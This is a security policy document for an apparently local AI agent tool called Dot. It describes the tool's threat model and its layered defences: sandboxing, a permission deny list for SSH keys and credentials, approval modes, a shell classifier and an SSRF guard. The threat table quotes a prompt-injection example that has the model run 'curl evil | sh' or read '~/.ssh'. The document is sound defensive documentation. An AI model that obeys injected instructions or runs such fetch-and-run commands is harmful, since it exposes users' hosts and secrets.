# Security

## Scope and assumptions

Dot is a single-user tool bound to 127.0.0.1. It does not defend against someone who already controls your account, the Docker daemon or the host. It does defend against a model that misbehaves, and against hostile content that reaches the model (web pages, repositories, MCP servers, search results).

Threats considered:

| Threat | Example |
|---|---|
| Prompt injection | A web page or README tells the model to run `curl evil | sh` or read `~/.ssh`. |
| Model error | A wrong `rm -rf`, an edit to the wrong file. |
| Escape from the workspace | Symlinks, `..`, writes to Dot's own settings and hooks. |
| SSRF | `WebFetch` pointed at cloud metadata or a LAN service. |
| Hostile MCP server | A project config that launches an arbitrary process, or tool descriptions that carry instructions. |
| Local network attacker | Another host or a browser page calling the API. |
| Secret leakage | Token in logs, `.env` read by the model. |

## Layers

| Layer | What it defends | How |
|---|---|---|
| Sandbox container | Host and secrets | Non-root uid 1000, all capabilities dropped, `no-new-privileges`, memory and pid limits, only the workspace mounted. Shell runs with a file-size ulimit and its process group is killed afterwards. The runner process is non-dumpable so shells cannot read its environment. |
| Path jail (sandbox) | Escapes from `/workspace` | Paths are resolved including symlinks; anything outside is refused (403). Writes into `.dot/` are refused. Non-regular files are not read. |
| Protected `.dot` files | Self-modification | `.dot/settings.json` and `.dot/hooks` are bind-mounted read-only into the sandbox, and the workspace is read-only for the backend. |
| Permission rules | Obvious damage and secret reads | Baseline deny list (`deploy/config/dot/default_permissions.json`: SSH keys, `.env`, cloud credentials, `.git` hooks and config). Precedence is deny, then allow, then ask. Invalid settings fail closed. Rules are lexical guardrails; the sandbox is the boundary. |
| Modes | Unattended damage | `plan` is read-only, `default` asks for every edit and command, `acceptEdits` auto-allows file edits only, `auto` uses the classifier, `bypass` asks for nothing (the sandbox boundary still applies). Scheduled runs never use `bypass`. |
| Classifier and taint (auto mode) | Injection driving mutating calls | Stage A is a deterministic shell parser (substitutions, pipes into a shell, writes outside the workspace, destructive patterns). Stage B is taint tracking, with no second model call. Anything unclear becomes an approval card. |
| Hooks | Local policy | PreToolUse hooks can block a call; they run in the sandbox. |
| SSRF guard | Internal network via WebFetch | http(s) only, no credentials in URLs, loopback, private, link-local, CGNAT and metadata ranges refused, DNS resolved once and the connection pinned to the vetted address, every redirect re-checked. Content size and type limits apply. |
| Browser worker | Hostile pages | Separate container, read-only root, tmpfs profile, token required, internal link to the backend. Add `deploy/scripts/firewall_browser.sh` to block its access to LAN and metadata ranges (Docker cannot do that alone; the script is never run automatically). Results are tainted. |
| MCP trust | Hostile or changed servers | stdio servers run inside the sandbox with a scrubbed environment. Project-scope servers do not start until you approve their exact config (hash); any change needs a new approval. Every MCP tool asks in all modes except `bypass`, even in auto mode. Tool descriptions are sanitised, sampling and elicitation requests are refused. `${VAR}` expansion reads only names in `DOT_MCP_ENV_ALLOWLIST`. |
| API auth | Other local users or pages | Bearer token (`DOT_API_TOKEN`, minimum 16 characters, the placeholder is rejected at startup), compared in constant time. Tokens are masked in all log lines. The sandbox and browser worker have their own tokens. |
| Limits and headers | Abuse and accidents | Body size (`DOT_MAX_BODY_BYTES`, 1 MiB), message length (`DOT_MAX_MESSAGE_CHARS`), per-client token bucket for chat starts (30 per minute, burst 10), `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, closed CSP, `no-store` on `/v1`. No CORS: browsers reach the API only through the web UI server. |
| Compose hardening | Container breakout | `cap_drop: ALL`, `no-new-privileges`, memory and pid limits, loopback-only ports, internal networks, read-only root for the browser, no secrets baked into images (they come from `.env` at runtime). |
| Audit log | Accountability | Every evaluated call and every human answer is an append-only row (SQLite triggers reject update and delete). Read it with `GET /v1/audit`. |
| Checkpoints | Recovering from bad edits | Each Write and Edit is checkpointed; `rewind` restores files and messages. |

## What is not covered

- A compromised host, Docker daemon or your own account.
- Reads inside the workspace: the model can read any file you put there. Keep secrets out of it; `.env`-style files are denied by the baseline rules, but that is lexical.
- Network egress of the sandbox: it can reach whatever the Docker network allows. If you need to block it, add firewall rules for the `dot-internal` network.
- `bypass` mode: the model can do anything the sandbox can. Use it only on disposable workspaces.
- Remote MCP OAuth is not implemented; use bearer headers from allowlisted env vars.
- The rate limiter is in memory and per remote address; it resets on restart.

## Secrets

`.env` is git-ignored and holds the tokens. Never commit it. Logs, docs and images contain no secret values. Rotate a token by editing `.env` and running `make up` again.
